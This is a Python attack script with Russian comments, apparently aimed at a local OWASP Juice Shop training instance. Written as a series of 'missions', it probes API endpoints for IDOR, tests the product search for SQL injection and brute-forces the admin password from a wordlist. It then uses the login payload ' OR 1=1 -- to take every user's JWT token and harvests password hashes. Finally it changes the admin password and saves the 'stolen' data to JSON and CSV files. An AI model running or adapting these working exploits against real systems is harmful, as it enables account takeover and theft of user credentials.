import requests
import json
import csv

# JWT-токен обычного пользователя (tolik) - наш агент в тылу врага
user_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0b2xpa0B0ZXN0ZXIucnUiLCJwYXNzd29yZCI6IjM1ZDY5MTJjM2MwY2QxMzNiOTI3MTNjODkzZTVjYWIyIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI2LTA3LTExIDE4OjE2OjIyLjE1OCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI2LTA3LTExIDE4OjIwOjUxLjU3MiArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3ODM3OTQ3MzN9.SsVpy41B5XcgyORKOUKFyUqp0GFhme-oI0UZsZ1XRkyh5X3kcCfFsGAowPZmM5D6neDfTTABZSJivmHlxouWlrs1j2YSlg4X9sanuJfNZZ4iRrVOfdrnssw1uiJeTqy-2rCQ0YnsbKZDcwGFbabLwjKn3PRhco1LzmCy-_YqBwQ"

headers_user = {
    "Authorization": f"Bearer {user_token}",
    "Content-Type": "application/json"
}

base_url = "http://localhost:3000"
all_stolen_data = []
login_url = f"{base_url}/rest/user/login"

# --- МИССИЯ 1: Проверка доступа к API ---
print("=" * 50)
print("--- [МИССИЯ 1] Проверка доступа к API ---")
api_endpoints = [
    "/api/Users",
    "/api/Products",
    "/api/Orders",
    "/api/Challenges"
]

for endpoint in api_endpoints:
    url = f"{base_url}{endpoint}"
    print(f"[*] Проверяю: {endpoint}")
    try:
        response = requests.get(url, headers=headers_user)
        if response.status_code == 200:
            print(f"  [НАЙДЕНО!] Уязвимость IDOR! Доступ к {endpoint} открыт.")
        elif response.status_code == 401:
            print(f"  [ЗАЩИЩЕНО] Доступ к {endpoint} запрещён.")
        else:
            print(f"  [?] Неожиданный статус: {response.status_code}")
    except Exception as e:
        print(f"  [!] Ошибка при запросе: {e}")

# --- МИССИЯ 1.5: Проверка на SQLi ---
print("\n" + "=" * 50)
print("--- [МИССИЯ 1.5] Проверка на SQLi ---")
sqli_test_url = f"{base_url}/rest/products/search?q=' OR '1'='1"

print(f"[*] Проверяю поиск товаров на SQLi...")
try:
    response = requests.get(sqli_test_url, headers=headers_user)
    if response.status_code == 200:
        data = response.json().get("data", [])
        if len(data) > 10:
            print(f"  [НАЙДЕНО!] SQLi в поиске товаров! Вернулось {len(data)} товаров.")
        else:
            print(f"  [-] SQLi не подтверждена. Вернулось {len(data)} товаров.")
    else:
        print(f"  [?] Неожиданный статус: {response.status_code}")
except Exception as e:
    print(f"  [!] Ошибка при проверке SQLi: {e}")

# --- МИССИЯ 1.6: Brute-force пароля админа ---
print("\n" + "=" * 50)
print("--- [МИССИЯ 1.6] Brute-force пароля админа ---")

wordlist_path = "/home/alehandro/pentest/wordlists/fasttrack.txt"
try:
    with open(wordlist_path, "r") as f:
        passwords = [line.strip() for line in f.readlines() if line.strip()]
    print(f"[*] Загружено {len(passwords)} паролей. Начинаю перебор...")
    found = False
    for pwd in passwords[:20]:
        login_data = {
            "email": "admin@juice-sh.op",
            "password": pwd
        }
        try:
            response = requests.post(login_url, json=login_data, headers=headers_user)
            if response.status_code == 200:
                print(f"  [!] ПАРОЛЬ НАЙДЕН! email: admin@juice-sh.op, password: {pwd}")
                found = True
                break
            else:
                print(f"  [-] {pwd} — не подходит (статус: {response.status_code})")
        except Exception as e:
            print(f"  [!] Ошибка при попытке {pwd}: {e}")
    if not found:
        print("  [-] Пароль не найден в первых 20 попытках.")
except FileNotFoundError:
    print(f"  [!] Файл словаря не найден: {wordlist_path}")

# --- МИССИЯ 2: Массовая кража данных и ТОКЕНОВ ---
print("\n" + "=" * 50)

print("--- [МИССИЯ 2] Массовая кража данных и JWT-токенов всех пользователей ---")
users_list_url = f"{base_url}/api/Users"

try:
    response = requests.get(users_list_url, headers=headers_user)
    if response.status_code == 200:
        users = response.json().get("data", [])
        print(f"[!] УСПЕХ! Получен список из {len(users)} пользователей.")

        for user in users:
            user_id = user.get("id")
            email = user.get("email")
            role = user.get("role")
            # Сразу сохраняем основную инфу
            stolen_info = {
                "id": user_id,
                "email": email,
                "role": role,
                "jwt_token": "",
                "deluxeToken": user.get("deluxeToken", ""),
                "password_hash": user.get("password", ""),
                "username": user.get("username", ""),
                "isActive": user.get("isActive")
            }

            # 1. Получаем расширенную инфу по ID
            user_detail_url = f"{base_url}/api/Users/{user_id}"
            try:
                detail_response = requests.get(user_detail_url, headers=headers_user)
                if detail_response.status_code == 200:
                    user_detail = detail_response.json().get("data", {})
                    stolen_info["password_hash"] = user_detail.get("password", stolen_info["password_hash"])
                    stolen_info["username"] = user_detail.get("username", stolen_info["username"])
                    stolen_info["deluxeToken"] = user_detail.get("deluxeToken", stolen_info["deluxeToken"])
            except Exception as e:
                print(f"  [!] Ошибка при запросе деталей для ID {user_id}: {e}")

            # 2. Пытаемся получить JWT-токен через SQLi
            login_data = {"email": email, "password": "' OR 1=1 --"}
            try:
                login_response = requests.post(login_url, json=login_data, headers=headers_user)
                if login_response.status_code == 200:
                    stolen_info["jwt_token"] = login_response.json()["authentication"]["token"]
            except:
                pass

            if stolen_info["jwt_token"]:
                print(
                    f"  [УКРАДЕНО] ID: {user_id}, Email: {email}, Роль: {role}, JWT: {stolen_info['jwt_token'][:50]}...")
            elif stolen_info["deluxeToken"]:
                print(f"  [УКРАДЕНО] ID: {user_id}, Email: {email}, Роль: {role}, Deluxe: {stolen_info['deluxeToken']}")
            else:
                print(f"  [УКРАДЕНО] ID: {user_id}, Email: {email}, Роль: {role}")

            all_stolen_data.append(stolen_info)

except Exception as e:
    print(f"[!] Критическая ошибка: {e}")

# --- МИССИЯ 3: Захват аккаунта Админа ---
print("\n" + "=" * 50)
print("--- [МИССИЯ 3] Захват аккаунта Админа (Смена пароля) ---")

# Ищем токен админа в украденных данных
admin_data = next((item for item in all_stolen_data if item["email"] == "admin@juice-sh.op" and item["jwt_token"]),
                  None)

if admin_data and admin_data["jwt_token"]:
    print("[*] Использую украденный токен админа для смены пароля...")
    admin_token = admin_data["jwt_token"]
    headers_admin = {
        "Authorization": f"Bearer {admin_token}",
        "Content-Type": "application/json"
    }
    target_admin_id = 1
    new_password = "pwned_by_tolik_1337"

    print(f"[*] Меняем пароль админа (id={target_admin_id}) на '{new_password}'...")
    change_password_url = f"{base_url}/api/Users/{target_admin_id}"
    new_data = {"password": new_password}

    try:
        response = requests.put(change_password_url, headers=headers_admin, json=new_data)
        if response.status_code == 200:
            admin_data_resp = response.json().get("data", {})
            print(f"[!] УСПЕХ! Пароль администратора изменён!")
            print(f"  Новый пароль: {new_password}")
        elif response.status_code == 401:
            print("[-] Не удалось. Админский токен не даёт права на смену пароля.")
        else:
            print(f"[?] Неожиданный ответ сервера: {response.status_code}")
    except Exception as e:
        print(f"[!] Ошибка: {e}")
else:
    print("[-] Не удалось получить админский токен для смены пароля.")

# --- Сохраняем всё в JSON-файл ---
print("\n" + "=" * 50)
print("[*] Сохраняю все украденные данные в файл 'stolen_tokens.json'...")
output_file = "/home/alehandro/pentest/scripts/stolen_tokens.json"

try:
    with open(output_file, "w", encoding="utf-8") as f:
        json.dump(all_stolen_data, f, indent=4, ensure_ascii=False)
    print(f"[!] УСПЕХ! {len(all_stolen_data)} записей сохранено в {output_file}")
except Exception as e:
    print(f"[!] Не удалось сохранить файл: {e}")

print("\n" + "=" * 50)
# --- Сохраняем в CSV ---
import csv

csv_file = "/home/alehandro/pentest/scripts/stolen_tokens.csv"
print(f"\n[*] Сохраняю данные в CSV-файл '{csv_file}'...")

try:
    with open(csv_file, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["id", "email", "role", "jwt_token", "deluxeToken", "password_hash", "username", "isActive"])
        writer.writeheader()
        writer.writerows(all_stolen_data)
    print(f"[!] УСПЕХ! {len(all_stolen_data)} записей сохранено в {csv_file}")
except Exception as e:
    print(f"[!] Не удалось сохранить CSV: {e}")
print("[*] Все миссии завершены.")